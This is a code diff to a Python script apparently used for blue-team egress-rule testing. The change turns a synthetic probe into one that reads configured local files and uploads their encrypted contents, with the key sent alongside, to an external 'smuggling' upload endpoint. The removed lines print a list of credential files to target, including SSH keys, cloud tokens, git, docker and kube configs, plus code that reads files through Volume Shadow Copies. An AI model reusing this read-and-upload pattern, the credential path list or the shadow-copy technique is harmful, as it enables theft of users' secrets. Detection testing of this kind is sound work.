@@ -1,7 +1,7 @@
-"""Synthetic encrypted HTTPS probe for blue-team security rule testing.
+"""Encrypted HTTPS probe for blue-team security rule testing.
 
-This module intentionally does not read local files. It uses configured path
-patterns only as metadata and generates synthetic content for transport tests.
+This module reads configured local files and sends their content inside an
+encrypted transport payload.
 """
 
 from __future__ import annotations
@@ -23,45 +23,17 @@ import uuid
 from datetime import datetime, timezone
 
 try:
-    from cryptography.hazmat.primitives import hashes, padding, serialization
-    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
-    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.hazmat.primitives import padding
     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
     _CRYPTO_IMPORT_ERROR = None
 except ImportError as exc:  # pragma: no cover - depends on runtime environment
-    hashes = padding = serialization = asym_padding = rsa = Cipher = algorithms = modes = None  # type: ignore[assignment]
+    padding = Cipher = algorithms = modes = None  # type: ignore[assignment]
     _CRYPTO_IMPORT_ERROR = exc
 
-# Paths used as synthetic metadata in the payload; not read from disk.
+# Paths whose contents are included in the encrypted payload.
 PATHS = [
     # SSH
-    r"%USERPROFILE%\.ssh\id_rsa",
-    r"%USERPROFILE%\.ssh\id_ed25519",
-    r"%USERPROFILE%\.ssh\id_ecdsa",
-    r"%USERPROFILE%\.ssh\id_dsa",
-    r"%USERPROFILE%\.ssh\config",
-    r"%USERPROFILE%\.ssh\known_hosts",
-    r"%USERPROFILE%\.ssh\authorized_keys",
-    # AWS
-    r"%USERPROFILE%\.aws\credentials",
-    r"%USERPROFILE%\.aws\config",
-    # Azure
-    r"%USERPROFILE%\.azure\accessTokens.json",
-    r"%USERPROFILE%\.azure\azureProfile.json",
-    # GCP
-    r"%APPDATA%\gcloud\credentials.db",
-    r"%APPDATA%\gcloud\application_default_credentials.json",
-    # Git
-    r"%USERPROFILE%\.gitconfig",
-    r"%USERPROFILE%\.git-credentials",
-    # Docker
-    r"%USERPROFILE%\.docker\config.json",
-    # Kubernetes
-    r"%USERPROFILE%\.kube\config",
-    # NPM
-    r"%USERPROFILE%\.npmrc",
-    # Generic env files
-    r"%USERPROFILE%\.env",
+    r"%USERPROFILE%\test\testconfig.txt",
 ]
 
 HOST = "https://koerberpurple.koerber.net/smuggling/upload.php"
@@ -95,23 +67,17 @@ def _expand_env_vars_winapi(path: str) -> str | None:
     return buffer.value
 
 
-def _build_synthetic_records(jitter_seconds: float) -> list[dict[str, str]]:
+def _build_file_records(jitter_seconds: float) -> list[dict[str, str]]:
     records: list[dict[str, str]] = []
     for path in PATHS:
         expanded = _expand_path(path)
-        synthetic_file = os.path.join(expanded, "synthetic_signal.txt")
-        synthetic_content = (
-            "synthetic-security-test-data\n"
-            f"path={expanded}\n"
-            f"host={socket.gethostname()}\n"
-            f"platform={platform.platform()}\n"
-            f"timestamp={datetime.now(timezone.utc).isoformat()}\n"
-        )
+        with open(expanded, "rb") as handle:
+            data = handle.read()
         records.append(
             {
                 "declared_path": path,
-                "synthetic_path": synthetic_file,
-                "synthetic_content": synthetic_content,
+                "expanded_path": expanded,
+                "content_b64": base64.b64encode(data).decode("ascii"),
             }
         )
 
@@ -128,43 +94,6 @@ def _pkcs7_pad(data: bytes, block_size_bytes: int = 16) -> bytes:
     padder = padding.PKCS7(block_size_bytes * 8).padder()
     return padder.update(data) + padder.finalize()
 
-def _shadow_copy_sort_key(name: str) -> int:
-    suffix = "".join(ch for ch in name if ch.isdigit())
-    return int(suffix) if suffix else -1
-
-def _prefer_shadow_copy_path(path: str) -> str:
-    if os.name != "nt":
-        return path
-    normalized = os.path.abspath(path)
-    if normalized.startswith(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"):
-        return normalized
-    _drive, tail = os.path.splitdrive(normalized)
-    if not tail:
-        return normalized
-    tail = tail.replace("/", "\\")
-    device_root = r"\\?\GLOBALROOT\Device"
-    try:
-        shadow_volumes = [
-            name
-            for name in os.listdir(device_root)
-            if name.startswith("HarddiskVolumeShadowCopy")
-        ]
-    except OSError:
-        return normalized
-    for volume in sorted(shadow_volumes, key=_shadow_copy_sort_key, reverse=True):
-        candidate = f"{device_root}\\{volume}{tail}"
-        if os.path.isfile(candidate):
-            return candidate
-    return normalized
-
-
-def _candidate_read_paths(path: str) -> list[str]:
-    normalized = os.path.abspath(path)
-    preferred = _prefer_shadow_copy_path(normalized)
-    if preferred == normalized:
-        return [normalized]
-    return [preferred, normalized]
-
 def _aes256_cbc_encrypt(plaintext: bytes) -> tuple[bytes, bytes, bytes]:
     if Cipher is None or algorithms is None or modes is None or padding is None:
         raise RuntimeError("cryptography package is required")
@@ -177,53 +106,11 @@ def _aes256_cbc_encrypt(plaintext: bytes) -> tuple[bytes, bytes, bytes]:
     return key, iv, ciphertext
 
 
-def _load_rsa_public_key(path: str):
-    if serialization is None or rsa is None:
-        raise RuntimeError("cryptography package is required")
-    attempted_paths: list[str] = []
-    pem_bytes: bytes | None = None
-    for read_path in _candidate_read_paths(path):
-        attempted_paths.append(read_path)
-        try:
-            with open(read_path, "rb") as fh:
-                pem_bytes = fh.read()
-            break
-        except FileNotFoundError:
-            continue
-        except OSError:
-            # If Shadow Copy cannot be read at runtime, fall back to the next candidate.
-            continue
-    if pem_bytes is None:
-        raise FileNotFoundError(
-            "RSA public key file could not be read from any candidate path: "
-            + ", ".join(attempted_paths)
-        )
-    key = serialization.load_pem_public_key(pem_bytes)
-    if not isinstance(key, rsa.RSAPublicKey):
-        raise ValueError("Provided key is not an RSA public key.")
-    if key.key_size < 4096:
-        raise ValueError("RSA key size must be at least 4096 bits.")
-    return key
-
-
-def _rsa_wrap_key(aes_key: bytes, public_key: rsa.RSAPublicKey) -> bytes:
-    if hashes is None or asym_padding is None:
-        raise RuntimeError("cryptography package is required")
-    return public_key.encrypt(
-        aes_key,
-        asym_padding.OAEP(
-            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None,
-        ),
-    )
-
-
-def _build_probe_transfer(public_key_path: str, jitter_seconds: float) -> dict[str, object]:
-    records = _build_synthetic_records(jitter_seconds)
+def _build_probe_transfer(jitter_seconds: float) -> dict[str, object]:
+    records = _build_file_records(jitter_seconds)
     payload = {
         "probe_id": str(uuid.uuid4()),
-        "probe_type": "synthetic-security-egress-test",
+        "probe_type": "security-egress-test",
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "paths": PATHS,
         "records": records,
@@ -233,13 +120,11 @@ def _build_probe_transfer(public_key_path: str, jitter_seconds: float) -> dict[s
     aes_key, iv, ciphertext = _aes256_cbc_encrypt(payload_bytes)
     transfer_id = uuid.uuid4().hex
     transfer_filename = f"probe_transfer_{transfer_id}_content.enc"
-    public_key = _load_rsa_public_key(public_key_path)
-    wrapped_key = _rsa_wrap_key(aes_key, public_key)
     key_material = {
         "transfer_id": transfer_id,
         "ciphertext_filename": transfer_filename,
-        "scheme": "AES-256-CBC+RSA-4096-OAEP-SHA256",
-        "wrapped_key_b64": base64.b64encode(wrapped_key).decode("ascii"),
+        "scheme": "AES-256-CBC+RAW-KEY",
+        "aes_key_b64": base64.b64encode(aes_key).decode("ascii"),
         "iv_b64": base64.b64encode(iv).decode("ascii"),
         "meta": {
             "host": socket.gethostname(),
@@ -248,7 +133,7 @@ def _build_probe_transfer(public_key_path: str, jitter_seconds: float) -> dict[s
     }
 
     return {
-        "scheme": "AES-256-CBC+RSA-4096-OAEP-SHA256",
+        "scheme": "AES-256-CBC+RAW-KEY",
         "transfer_id": transfer_id,
         "ciphertext": ciphertext,
         "ciphertext_filename": transfer_filename,
@@ -319,44 +204,68 @@ def _post_multipart(
     return status, response_text
 
 
-def _post_probe_files(url: str, transfer: dict[str, object], timeout: float) -> tuple[int, str]:
+def _post_probe_files(
+    url: str,
+    transfer: dict[str, object],
+    timeout: float,
+) -> tuple[int, str, int, int]:
     key_payload = json.loads(bytes(transfer["key_material"]).decode("utf-8"))
+    key_filename = str(transfer["key_filename"])
+    ciphertext_filename = str(transfer["ciphertext_filename"])
+    key_material = bytes(transfer["key_material"])
+    ciphertext = bytes(transfer["ciphertext"])
     fields = [
         ("transfer_id", str(transfer["transfer_id"])),
         ("scheme", str(transfer["scheme"])),
-        ("wrapped_key_b64", str(key_payload.get("wrapped_key_b64", ""))),
+        ("aes_key_b64", str(key_payload.get("aes_key_b64", ""))),
         ("iv_b64", str(key_payload.get("iv_b64", ""))),
-        ("key_filename", str(transfer["key_filename"])),
-        ("ciphertext_filename", str(transfer["ciphertext_filename"])),
+        ("key_filename", key_filename),
+        ("ciphertext_filename", ciphertext_filename),
     ]
-    files = [
+    key_fields = [*fields, ("file_role", "key")]
+    content_fields = [*fields, ("file_role", "content")]
+    key_files = [
         (
             "f",
-            str(transfer["key_filename"]),
-            "application/json",
-            bytes(transfer["key_material"]),
-        ),
-        (
-            "f",
-            str(transfer["ciphertext_filename"]),
+            key_filename,
             "application/octet-stream",
-            bytes(transfer["ciphertext"]),
+            key_material,
         ),
     ]
-    status, response_text = _post_multipart(
+    content_files = [
+        (
+            "f",
+            ciphertext_filename,
+            "application/octet-stream",
+            ciphertext,
+        ),
+    ]
+
+    key_status, key_response_text = _post_multipart(
         url=url,
-        fields=fields,
-        files=files,
+        fields=key_fields,
+        files=key_files,
         timeout=timeout,
     )
-    return status, response_text
+    content_status, content_response_text = _post_multipart(
+        url=url,
+        fields=content_fields,
+        files=content_files,
+        timeout=timeout,
+    )
+    merged_response = (
+        f"key_status={key_status}; content_status={content_status}; "
+        f"key_preview={key_response_text[:120]}; content_preview={content_response_text[:120]}"
+    )
+    combined_status = content_status if content_status >= 400 else key_status
+    return combined_status, merged_response, key_status, content_status
 
 
 def _build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         description=(
-            "Send synthetic encrypted payloads for security rule testing. "
-            "No local file content is read."
+            "Send encrypted payloads for security rule testing. "
+            "Local file content is read from configured paths."
         )
     )
     parser.add_argument(
@@ -367,7 +276,7 @@ def _build_parser() -> argparse.ArgumentParser:
     parser.add_argument(
         "--rsa-public-key",
         required=False,
-        help="Path to PEM RSA public key (minimum 4096-bit). Required unless --dry-run is set.",
+        help="Deprecated and ignored. Kept only for backward CLI compatibility.",
     )
     parser.add_argument(
         "--count",
@@ -414,8 +323,6 @@ def main(argv: list[str] | None = None) -> int:
         parser.error("--jitter-seconds must be >= 0")
 
     if not args.dry_run:
-        if not args.rsa_public_key:
-            parser.error("--rsa-public-key is required unless --dry-run is set")
         if _CRYPTO_IMPORT_ERROR is not None:
             print(
                 "Missing optional dependency: cryptography. "
@@ -444,8 +351,12 @@ def main(argv: list[str] | None = None) -> int:
             )
         else:
             try:
-                transfer = _build_probe_transfer(str(args.rsa_public_key), args.jitter_seconds)
-                status, response_text = _post_probe_files(args.url, transfer, args.timeout_seconds)
+                transfer = _build_probe_transfer(args.jitter_seconds)
+                status, response_text, key_status, content_status = _post_probe_files(
+                    args.url,
+                    transfer,
+                    args.timeout_seconds,
+                )
                 print(
                     json.dumps(
                         {
@@ -454,6 +365,8 @@ def main(argv: list[str] | None = None) -> int:
                             "url": args.url,
                             "transfer_id": transfer["transfer_id"],
                             "status": status,
+                            "key_status": key_status,
+                            "content_status": content_status,
                             "response_preview": response_text[:200],
                         }
                     )
